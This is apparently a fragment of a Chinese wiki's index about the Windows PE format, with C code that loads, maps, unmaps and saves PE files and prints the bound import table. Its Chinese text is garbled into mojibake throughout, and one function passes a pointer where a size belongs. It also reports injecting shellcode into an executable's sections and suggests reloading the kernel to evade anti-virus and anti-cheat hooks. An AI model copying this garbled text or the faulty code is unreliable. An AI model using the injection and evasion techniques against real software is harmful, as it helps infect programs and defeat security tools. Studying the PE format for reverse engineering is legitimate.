å‡½æ•°åŠŸèƒ½ï¼šå°†ImageBufferå‹ç¼©ä¸ºNewFileBuffer inputå‚æ•°ï¼š pBufferï¼šæŒ‡å‘ImageBufferé¦–åœ°å€çš„æŒ‡é’ˆ outputå‚æ•°ï¼š SizeOfImageBufferï¼šè¿”å›NewFileBufferçš„å¤§å°ï¼Œåœ¨å‡½æ•°ä¸­ç”¨SizeOfHeaders+æ‰€æœ‰èŠ‚.SizeOfRawDataç®—å‡ºæ¥çš„ è¿”å›å€¼ï¼š æˆåŠŸï¼Œè¿”å›NewFileBufferé¦–åœ°å€æŒ‡é’ˆ å¤±è´¥ï¼Œè¿”å›NULL*/void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer);/* å‡½æ•°åŠŸèƒ½ï¼šå°†å†…å­˜ä¸­pdataèµ·å§‹ï¼Œsizeä¸ªå­—èŠ‚çš„æ•°æ®å­˜åˆ°ç£ç›˜æ–‡ä»¶pOutputFilePathä¸­ inputå‚æ•°ï¼š pdataï¼šå†…å­˜é¦–åœ°å€ sizeï¼š å¤§å°ï¼ˆå­—èŠ‚ï¼‰ outputå‚æ•°ï¼š pOutputFilePathï¼šè¾“å‡ºçš„æ–‡ä»¶è·¯å¾„ è¿”å›å€¼ï¼š1è¡¨ç¤ºæˆåŠŸï¼Œ0è¡¨ç¤ºå¤±è´¥*/BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath);123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221#include &quot;Global.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable:4996) //disable warning of unsafe function fopensize_t GetFileSize(FILE* pFile)&#123;\tsize_t file_size;\t// å®šä½åˆ°æ–‡ä»¶æœ«å°¾\tif (fseek(pFile, 0, SEEK_END) != 0)\t&#123; perror(&quot;Error seeking to end of file&quot;); return -1;\t&#125;\t// è·å–æ–‡ä»¶å¤§å°\tfile_size = ftell(pFile);\tif (file_size == -1L)\t&#123; perror(&quot;Error getting file size&quot;); return -1;\t&#125;\t//rewind(pFile); //ä¹Ÿå¯ä»¥ï¼Œä¹Ÿæ˜¯å›åˆ°æ–‡ä»¶å¼€å¤´\t// å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹\tif (fseek(pFile, 0, SEEK_SET) != 0)\t&#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return -1;\t&#125;\treturn file_size;&#125;void* ReadFileToFileBuffer(const char* filepath, size_t* length)&#123;\tFILE* pFile;\tvoid* buffer; // æ¥mallocè¿”å›å€¼\tsize_t file_size; // æ¥æ–‡ä»¶å¤§å°\t// æ‰“å¼€æ–‡ä»¶\tpFile = fopen(filepath, &quot;rb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file&quot;); return NULL;\t&#125;\t// è·å–æ–‡ä»¶å¤§å°\tfile_size = GetFileSize(pFile);\tif (file_size == -1)\t&#123; printf(&quot;Error getting the size of this file&quot;); fclose(pFile); return NULL;\t&#125;\t//// å®šä½åˆ°æ–‡ä»¶æœ«å°¾\t//if (fseek(pFile, 0, SEEK_END) != 0)\t//&#123;\t// perror(&quot;Error seeking to end of file&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t//// è·å–æ–‡ä»¶å¤§å°\t//file_size = ftell(pFile);\t//if (file_size == -1L)\t//&#123;\t// perror(&quot;Error getting file size&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t//// å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹\t//if (fseek(pFile, 0, SEEK_SET) != 0)\t//&#123;\t// perror(&quot;Error seeking to start of file&quot;);\t// fclose(pFile);\t// return NULL;\t//&#125;\t// åˆ†é…å†…å­˜\tbuffer = malloc(file_size);\tif (buffer == NULL)\t&#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL;\t&#125;\t// freadæ˜¯ä»å½“å‰æ–‡ä»¶æŒ‡é’ˆå¼€å§‹è¯»å–\t// è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜\tif (fread(buffer, 1, file_size, pFile) != file_size)\t&#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL;\t&#125;\t// å…³é—­æ–‡ä»¶\tfclose(pFile);\t// å¦‚æœéœ€è¦ï¼Œè¿”å›æ–‡ä»¶å¤§å°\tif (length != NULL)\t&#123; *length = file_size;\t&#125;\t// è¿”å›å†…å­˜ç¼“å†²åŒºçš„æŒ‡é’ˆ\treturn buffer;&#125;void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer)&#123;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t*SizeOfImageBuffer = pImageOptionalHeader-&gt;SizeOfImage; //å­˜SizeOfImageçš„å€¼\tvoid* ImageBuffer;\tImageBuffer = malloc((size_t)SizeOfImageBuffer); //æŒ‰SizeOfImageç”³è¯·å¤§å°\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, (size_t)SizeOfImageBuffer); //å¡«å……0\t//åˆ†å—æ‹·è´\t//1ã€æ‹·SizeOfHeaders\tmemcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2ã€å¾ªç¯æ‹·èŠ‚æ•°æ®\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn ImageBuffer;&#125;void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer)&#123;\t//DOSå¤´\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PEå¤´\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//æ ‡å‡†PEå¤´\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//æ‰©å±•PEå¤´\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//èŠ‚è¡¨\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//è®¡ç®—NewFileBufferå¤§å°ï¼Œä¸ºmallocåˆ†ç©ºé—´åšå‡†å¤‡\t*SizeOfNewFileBuffer = 0;\t*SizeOfNewFileBuffer += pImageOptionalHeader-&gt;SizeOfHeaders; //+SizeOfHeaders\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) //ä¾æ¬¡+SizeOfRawData\t&#123; *SizeOfNewFileBuffer += pImageSectionHeader[i].SizeOfRawData;\t&#125;\tvoid* NewFileBuffer;\tNewFileBuffer = malloc((size_t)*SizeOfNewFileBuffer); //æŒ‰*SizeOfNewFileBufferç”³è¯·å¤§å°\tif (NewFileBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(NewFileBuffer, 0, (size_t)*SizeOfNewFileBuffer); //å¡«å……0\t//åˆ†å—æ‹·è´\t//1ã€æ‹·SizeOfHeaders\tmemcpy(NewFileBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2ã€å¾ªç¯æ‹·èŠ‚æ•°æ®\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)NewFileBuffer + pImageSectionHeader[i].PointerToRawData), (void*)((DWORD)pBuffer + pImageSectionHeader[i].VirtualAddress), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn NewFileBuffer;&#125;BOOL MemoryToFile(const char* pdata, size_t size, const char* pOutputFilePath)&#123;\tFILE* pFile;\t//æ‰“å¼€æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶ï¼Œå¯å†™ æ‰“å¼€\tpFile = fopen(pOutputFilePath, &quot;wb&quot;);\tif (pFile == NULL)\t&#123; perror(&quot;Error opening file for writing&quot;); return 0;\t&#125;\t//å†™å…¥æ–‡ä»¶\tif (fwrite(pdata, 1, size, pFile) != size)\t&#123; perror(&quot;Error writing data to file&quot;); fclose(pFile); return 0;\t&#125;\tfclose(pFile);\treturn 1;&#125; æµ‹è¯• å¯¹fgæ·»åŠ shellcodeVitrualSize>SizeOfRawDataï¼Œæ— æ³•æ·»åŠ shellcodeï¼ˆfgçš„Sectionå¥½åƒå³ä½¿æ²¡æ‰§è¡Œæƒé™ä¹Ÿå¯ä»¥æ‰§è¡Œï¼Œæ²¡æ‰¾å…¶ä»–exeæ¥ç€éªŒè¯äº†ï¼‰ ä»£ç åŒºï¼Œæ·»åŠ shellcodeæˆåŠŸã€‚å…ˆå¼¹çª—åæ‰§è¡Œfg .dataåŒºï¼Œæ²¡æ‰§è¡Œæƒé™ã€‚æ·»åŠ shellcodeæˆåŠŸã€‚å…ˆå¼¹çª—åæ‰§è¡Œfg"},{"title":"ç»‘å®šå¯¼å…¥è¡¨","path":"/wiki/PE/ç»‘å®šå¯¼å…¥è¡¨.html","content":"å‰è¨€ å¦‚æœä¸€ä¸ªexeçš„IATè¡¨åœ¨åŠ è½½å‰å·²ç»æå‰æ›¿æ¢ä¸ºå¯¼å…¥å‡½æ•°çš„å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆç³»ç»ŸåŠ è½½å™¨åœ¨åŠ è½½è¿™ä¸ªexeæ—¶å°±èƒ½å…å»IATè¡¨æ›¿æ¢å·¥ä½œï¼ŒåŠ å¿«PEåŠ è½½é€Ÿåº¦ï¼Œè¿™å°±æ˜¯ç»‘å®šå¯¼å…¥ã€‚ä½†æå‰ç»‘å®šæ˜¯åŸºäºä»¥ä¸‹ä¸¤ç‚¹å‰æçš„ï¼š éœ€è¦çš„dlléƒ½èƒ½åŠ è½½åˆ°å®ƒé»˜è®¤çš„åŸºå€ä¸­ï¼Œæ²¡æœ‰å‘ç”Ÿé‡å®šä½ æå‰ç»‘å®šä¹‹åï¼Œdllè¾“å‡ºè¡¨ä¸­å¼•ç”¨çš„ç¬¦å·æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼ˆæ¯”å¦‚è¿™ä¸ªdllæ›´æ–°äº†ï¼Œå¼•ç”¨çš„ç¬¦å·ï¼Œå‡½æ•°åœ°å€å°±å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚æå‰ç»‘å®šå¥½çš„å€¼æ­¤æ—¶å°±æ˜¯ä¸æ­£ç¡®çš„äº†ï¼‰ æå‰ç»‘å®šæ˜¯ä¸€ä¸ªå¥½ä¸»æ„çš„ï¼Œå½“ç³»ç»ŸåŠ è½½å™¨åŠ è½½ä¸€ä¸ªå·²ç»ç»‘å®šå¥½çš„exeï¼Œä¼šæ£€æŸ¥æ˜¯å¦éœ€è¦é‡æ–°ç»‘å®šï¼š ä¸éœ€è¦é‡æ–°æ›¿æ¢ï¼ŒPEåŠ è½½é€Ÿåº¦æ˜¯åŠ å¿«äº†çš„ éœ€è¦é‡æ–°æ›¿æ¢ï¼Œé‚£å°±é‡æ–°è¿›è¡ŒIATè¡¨ä¸­çš„åœ°å€æ›¿æ¢å·¥ä½œ å¦‚ä½•æ£€æŸ¥ï¼š å·²ç»‘å®šåœ°å€çš„æ˜¯å¦æœ‰æ•ˆ å¯¼å…¥dllçš„æ—¶é—´æˆ³ä¸ç»‘å®šæ—¶çš„æ—¶é—´æˆ³æ˜¯å¦ä¸€è‡´ï¼ˆå³ç°åœ¨å¯¼å…¥çš„dllæ˜¯å¦å’Œç»‘å®šæ—¶çš„dllä¸€æ ·ï¼Œç°åœ¨å¯¼å…¥çš„dllæ˜¯å¦æœ‰æ›´æ–°ï¼‰ dllæ˜¯å¦é‡å®šä½äº† ç»‘å®šå¯¼å…¥è¡¨æŒ‡å‡ºäº†ç»‘å®šçš„ä¿¡æ¯ï¼Œé€šè¿‡è¿™å¼ è¡¨ç³»ç»ŸåŠ è½½å™¨å¯ä»¥å¾—çŸ¥æå‰ç»‘å®šäº†å“ªäº›dllï¼Œæ˜¯å¦éœ€è¦æ›¿æ¢IATè¡¨ï¼ˆé€šè¿‡å¯¹æ¯”æ—¶é—´æˆ³å¾—çŸ¥å¯¼å…¥çš„dllæ˜¯å¦æœ‰æ›´æ–°ï¼‰ã€‚ ç»‘å®šå¯¼å…¥è¡¨ ä»æ‹“å±•PEå¤´.æ•°æ®ç›®å½•è¡¨æ•°æ®çš„ç¬¬12ä¸ªæˆå‘˜å¾—åˆ°ç»‘å®šå¯¼å…¥è¡¨çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªå€¼æ˜¯RVAï¼‰å’Œå¤§å°ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å°†RVAè½¬ä¸ºFOAåï¼Œæ‰¾è¿‡å»ï¼Œæ˜¯ç»‘å®šå¯¼å…¥æ•°æ®çš„èµ·å§‹ä½ç½®ã€‚ ç³»ç»Ÿæ–‡ä»¶çš„ç»‘å®šå¯¼å…¥æ•°æ®åœ¨æ–‡ä»¶ä¸­çš„å­˜æ”¾ä½ç½®ï¼šå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¯¥æ•°æ®å­˜å‚¨åœ¨PEæ–‡ä»¶å¤´éƒ¨ï¼Œç´§è·Ÿåœ¨èŠ‚è¡¨ä¹‹å ç»‘å®šå¯¼å…¥æ•°æ®ä»¥ä¸€ä¸ªIMAGE_BOUND_IMPORT_DESCRIPTORï¼ˆIBIDï¼‰ç»“æ„ä½“ç±»å‹çš„æ•°ç»„å¼€å§‹ã€‚ 123456typedef struct _IMAGE_BOUND_IMPORT_DESCRIPTOR &#123; DWORD TimeDateStamp; // ç»‘å®šæ—¶é‚£ä¸ªdllä¸­çš„æ—¶é—´æˆ³ WORD OffsetModuleName; // å¯¼å…¥çš„dllçš„åç§° WORD NumberOfModuleForwarderRefs; // è¯¥dllè¿˜ä¾èµ–å‡ ä¸ªdllï¼Œæœ‰å‡ ä¸ªåé¢å°±æœ‰å‡ ä¸ªIMAGE_BOUND_FORWARDER_REFç»“æ„// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR, *PIMAGE_BOUND_IMPORT_DESCRIPTOR; TimeDateStampï¼šå¯¼å…¥dllçš„ä¸€ä¸ªæ—¶é—´æˆ³ã€‚ ç³»ç»ŸåŠ è½½å™¨é€šè¿‡OffsetModuleNameå¾—åˆ°å¯¼å…¥çš„dllåï¼Œé€šè¿‡æ¯”å¯¹è¿™ä¸ªå¯¼å…¥dllæ–‡ä»¶ä¸­æ ‡å‡†PEå¤´.TimeDateStampå’ŒIBIDç»“æ„.TimeDateStampæ¥å¾—çŸ¥å¯¼å…¥çš„dllæ˜¯å¦æœ‰æ›´æ–°ï¼Œæ—¶é—´æˆ³ä¸€æ ·å°±æ˜¯é…å¯¹çš„ã€‚ OffsetModuleNameï¼šä¸€ä¸ªæŒ‡å‘ä»¥â€™\\0â€™ç»“å°¾çš„ASCIIå­—ç¬¦ä¸²çš„åç§»ã€‚ è¿™ä¸ªå­—ç¬¦ä¸²æ˜¯å¯¼å…¥dllåç§°ã€‚ è¿™ä¸ªåç§»æ˜¯ç›¸å¯¹äºç¬¬ä¸€ä¸ªIBIDç»“æ„ä½“åŸºå€çš„å€¼ï¼Œæ—¢ä¸æ˜¯RVAï¼Œä¹Ÿä¸æ˜¯FOAã€‚åé¢æ‰€æœ‰OffsetModuleNameå­—æ®µçš„åç§»å…¨éƒ½æ˜¯ç›¸å¯¹äºç¬¬ä¸€ä¸ªIBIDç»“æ„ä½“åŸºå€çš„åç§»ã€‚ NumberOfModuleForwarderRefsï¼šç´§è·Ÿç€IBIDç»“æ„ä½“åè¿˜æœ‰å‡ ä¸ªIMAGE_BOUND_FORWARDER_REFç»“æ„ä½“ã€‚ IMAGE_BOUND_FORWARDER_REFç»“æ„ä½“å’ŒIBIDç»“æ„ä½“ä¸€æ ·ï¼Œä¸ºäº†ç»Ÿä¸€æ ¼å¼ï¼Œè¿™ä¸ªç»“æ„ä½“ä¸­æœ€åçš„WORDç±»å‹æˆå‘˜ä¿ç•™ã€‚ 12345typedef struct _IMAGE_BOUND_FORWARDER_REF &#123; DWORD TimeDateStamp; // ç»‘å®šæ—¶é‚£ä¸ªdllä¸­çš„æ—¶é—´æˆ³ WORD OffsetModuleName; // å¯¼å…¥çš„dllçš„åç§° WORD Reserved; // ä¿ç•™&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF; IMAGE_BOUND_IMPORT_DESCRIPTORç»“æ„åè·Ÿç€æ˜¯IMAGE_BOUND_FORWARDER_REFç»“æ„ä½“ï¼Œè¿™æ ·è®¾è®¡çš„ç›®çš„æ˜¯ä¸ºäº†æè¿°è¿™ç§æƒ…å†µï¼šexeä¸­éœ€è¦å¯¼å…¥A.dllï¼Œè€ŒA.dlléœ€è¦å¯¼å…¥A1.dllã€‚IMAGE_BOUND_IMPORT_DESCRIPTORæè¿°A.dllï¼Œç´§è·Ÿç€çš„å‘å‰å¼•ç”¨IMAGE_BOUND_FORWARDER_REFç”¨äºæè¿°A1.dllã€‚ ç»¼ä¸Šï¼Œç»‘å®šå¯¼å…¥æ•°æ®çš„ç»„ç»‡æ–¹å¼å¦‚ä¸‹å›¾ï¼š IMAGE_BOUND_IMPORT_DESCRIPTORç»“æ„åè·Ÿç€æ˜¯å®ƒçš„å‘å‰å¼•ç”¨æ•°ç»„ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ ç»‘å®šå¯¼å…¥æ•°æ®ç»“æ„å›¾æˆå‘˜å±•å¼€ç‰ˆç»‘å®šå¯¼å…¥è¡¨å›¾ç¤ºï¼ˆè¯¦ç»†ç‰ˆï¼‰ å»é™¤ç»‘å®šå¯¼å…¥è¡¨çš„å†…å®¹ä¸ä¼šå½±å“ç¨‹åºçš„æ­£å¸¸è¿è¡Œã€‚ å»é™¤æ–¹æ³•ï¼šå°†ç»‘å®šå¯¼å…¥æ•°æ®æ¸…0ï¼Œå°†æ•°æ®ç›®å½•è¡¨ä¸­çš„Bound importçš„RVAå’ŒSizeæ¸…0ã€‚ æ‰“å°ç»‘å®šå¯¼å…¥è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839VOID PEManipulator::PrintBoundImportTable()&#123; auto pBoundImportDirectory = (PIMAGE_BOUND_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT); if (!pBoundImportDirectory) &#123; return; &#125; int index = 1; //ç¬¬å‡ ä¸ªIBIDç»“æ„ auto dwBaseBoundImportDirectory = (DWORD)pBoundImportDirectory; while (pBoundImportDirectory-&gt;OffsetModuleName) //é‡è¦æˆå‘˜ä¸ä¸º0 &#123; printf(&quot; %d. BoundImportDescriptor: &quot;, index); printf(&quot; TimeDateStamp: 0x%08X &quot;, pBoundImportDirectory-&gt;TimeDateStamp); printf(&quot; OffsetModuleName: 0x%04X (\\&quot;%s\\&quot;) &quot;, pBoundImportDirectory-&gt;OffsetModuleName, (PCHAR)(dwBaseBoundImportDirectory + pBoundImportDirectory-&gt;OffsetModuleName)); printf(&quot; NumberOfModuleForwarderRefs: 0x%04X &quot;, pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs); // éå†å‰å‘å¼•ç”¨æ•°ç»„ for (int j = 1; j &lt;= pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs; j++) //è‡³å°‘ä¸º1ï¼Œæ‰æ‰§è¡Œå¾ªç¯ä½“ &#123; auto pBoundREF = (PIMAGE_BOUND_FORWARDER_REF)pBoundImportDirectory + j; //PIMAGE_BOUND_FORWARDER_REFç»“æ„å’ŒIBIDå¤§å°ä¸€æ ·ï¼Œé€šè¿‡æŒ‡é’ˆè¿ç®—æŒ‡è¿‡å» printf(&quot; %d. ModuleForwarderReference: &quot;, j); printf(&quot; TimeDateStamp: 0x%08X &quot;, pBoundREF-&gt;TimeDateStamp); printf(&quot; OffsetModuleName: 0x%04X (\\&quot;%s\\&quot;) &quot;, pBoundREF-&gt;OffsetModuleName, (PCHAR)(dwBaseBoundImportDirectory + pBoundREF-&gt;OffsetModuleName)); printf(&quot; Reserved: 0x%04X &quot;, pBoundREF-&gt;Reserved); &#125; printf(&quot; &quot;); //ä¸‹ä¸€ä¸ªç»‘å®šå¯¼å…¥è¡¨ pBoundImportDirectory += pBoundImportDirectory-&gt;NumberOfModuleForwarderRefs + 1; // æ•°é‡ + 1 æŒ‡é’ˆè¿ç®—æ“ä½œ ++index; &#125;&#125;"},{"title":"ç¼–ç¨‹ç»ƒä¹ ","path":"/wiki/PE/ç¼–ç¨‹ç»ƒä¹ _PE.html","content":"markï¼šä»£ç å‚è€ƒhttps://bbs.kanxue.com/thread-252795.htm æ¨¡æ‹ŸPE Loarderçš„æ‹‰ä¼¸ å‡½æ•° åŠŸèƒ½ è¾“å…¥ è¾“å‡º FileToFileBuffer ä¸ºç£ç›˜ä¸Šçš„æ–‡ä»¶åˆ›å»ºæ–‡ä»¶å†…å­˜æ˜ åƒï¼Œæ“ä½œæ–‡ä»¶å°±åƒæ“ä½œå†…å­˜å˜é‡æˆ–å†…å­˜æ•°æ®ä¸€æ ·æ–¹ä¾¿ ç£ç›˜ä¸Šçš„æ–‡ä»¶ FileBuffer FileBufferToImageBuffer å°†FileBufferæ‹‰ä¼¸ FileBuffer ImageBuffer ImageBufferToNewFileBuffer å°†ImageBufferå‹ç¼©å›å» ImageBuffer NewFileBuffer MemoryToFile å°†å†…å­˜ä¸­çš„æ•°æ®å­˜ç›˜ å†…å­˜ä¸­çš„buffer ç£ç›˜ä¸Šçš„æ–‡ä»¶ å†…æ ¸é‡è½½å†…æ ¸ä¹Ÿæ˜¯ä¸€ä¸ªç¨‹åºï¼Œå¾ˆå¤šæ€è½¯æˆ–æ¸¸æˆå…¬å¸ä¼šå¯¹è¿™ä¸ªå†…æ ¸ç¨‹åºä¸‹é’©å­åšæ£€æµ‹ã€‚å¦‚æœä½ ä¸æƒ³è·Ÿè¿™äº›é’©å­åšå¯¹æŠ—ï¼Œå¯ä»¥è‡ªå·±å°†ç£ç›˜ä¸Šçš„å†…æ ¸ç¨‹åºæ‹‰ä¼¸åˆ°å†…å­˜ï¼Œç„¶åä½¿ç”¨å†…æ ¸ä¸­çš„å‡½æ•°ã€‚æ‡’äººåšæ³•æ˜¯å®Œå…¨æ‹‰ä¼¸ï¼Œè¿™å¯èƒ½ä¼šè¢«æ£€æµ‹åˆ°ã€‚å®é™…æƒ…å†µä¸­ï¼Œè¦ç”¨åˆ°å†…æ ¸ä¸­å“ªå—å†…å®¹ï¼Œå°†äºŒè¿›åˆ¶æ‰£å‡ºæ¥æ”¾åˆ°è‡ªå·±çš„ä»£ç ä¸­æŒ‰éœ€ä½¿ç”¨ã€‚ FileToFileBuffer å°†è®°äº‹æœ¬çš„.exeæ–‡ä»¶è¯»å–åˆ°å†…å­˜ï¼Œå¹¶è¿”å›è¯»å–ååœ¨å†…å­˜ä¸­çš„åœ°å€ è¿‡ç¨‹æ‰“å¼€æ–‡ä»¶å¾—åˆ°æ–‡ä»¶çš„å¤§å°ï¼ˆfopenè¯»å–æ–‡ä»¶åˆ°å†…å­˜ï¼Œfseekè®©æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼Œftellè·å–æ–‡ä»¶å¤§å°ï¼‰mallocç”³è¯·å†…å­˜freadæŠŠæ–‡ä»¶ä¸­çš„å†…å®¹è¯»å–åˆ°å†…å­˜ä¸­è¿”å›å†…å­˜ç¼–å·fopenæ‰“å¼€çš„æ¨¡å¼ï¼štï¼šä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€ï¼›bï¼šä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€rï¼šåªè¯»freadï¼šfreadå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°sizeæŒ‡å®šäº†æ¯ä¸ªè¦è¯»å–çš„å…ƒç´ çš„å­—èŠ‚å¤§å°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°nmembæŒ‡å®šäº†è¦è¯»å–çš„å…ƒç´ ä¸ªæ•°ã€‚å‡½æ•°çš„è¿”å›å€¼æ˜¯æˆåŠŸè¯»å–çš„å…ƒç´ ä¸ªæ•°ã€‚é€šå¸¸ï¼ŒæŒ‰ç…§å•å­—èŠ‚å…ƒç´ æ¥è¯»å–æ–‡ä»¶æ›´å¸¸è§ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ç®€å•åœ°è®¡ç®—å‡ºè¯»å–äº†å¤šå°‘å­—èŠ‚ï¼›è€Œåœ¨å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œé€šå¸¸ä¸å…³å¿ƒæ›´å¤§çš„å…ƒç´ å¤§å°ã€‚ å†™æ³•ä¸€1234567// è¯»å–1ä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º file_size å­—èŠ‚// è¿”å›ç»“æœå’Œ1æ¯”è¾ƒ// å¦‚æœæ²¡æœ‰è¯»å–åˆ°1ä¸ªè¿™æ ·çš„å…ƒç´ ï¼Œåˆ™ä¸æ‰§è¡Œifè¯­å¥if (fread(buffer, file_size, 1, file) != 1)&#123; ...&#125; å†™æ³•äºŒ1234567// è¯»å–file_sizeä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ çš„å¤§å°ä¸º1å­—èŠ‚// è¿”å›ç»“æœå’Œfile_sizeæ¯”è¾ƒ// å¦‚æœæ²¡æœ‰è¯»å–åˆ°file_sizeä¸ªè¿™æ ·çš„å…ƒç´ ï¼Œåˆ™ä¸æ‰§è¡Œifè¯­å¥if (fread(buffer, 1, file_size, file) != file_size)&#123; ...&#125; å‡½æ•°å£°æ˜å‡½æ•°å®ç°1234567891011#include &lt;stdlib.h&gt; // åŒ…å«size_tçš„å®šä¹‰/* å‡½æ•°åŠŸèƒ½ï¼šå°†ä¸€ä¸ªæ–‡ä»¶è¯»å–åˆ°mallocåˆ†é…çš„å†…å­˜ä¸­ï¼Œè¿”å›åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€ inputå‚æ•°ï¼š filepathï¼šæ–‡ä»¶è·¯å¾„ outputå‚æ•°ï¼š lengthï¼šè¿”å›æ–‡ä»¶é•¿åº¦ è¿”å›å€¼ï¼šè¯¥æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„é¦–åœ°å€*/void* ReadFileToFileBuffer(const char* filepath, size_t* length);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#include &quot;ReadFileToFileBuffer.h&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //æ¥mallocè¿”å›å€¼ size_t file_size; // æ‰“å¼€æ–‡ä»¶ pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // å®šä½åˆ°æ–‡ä»¶æœ«å°¾ if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹ if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // åˆ†é…å†…å­˜ buffer 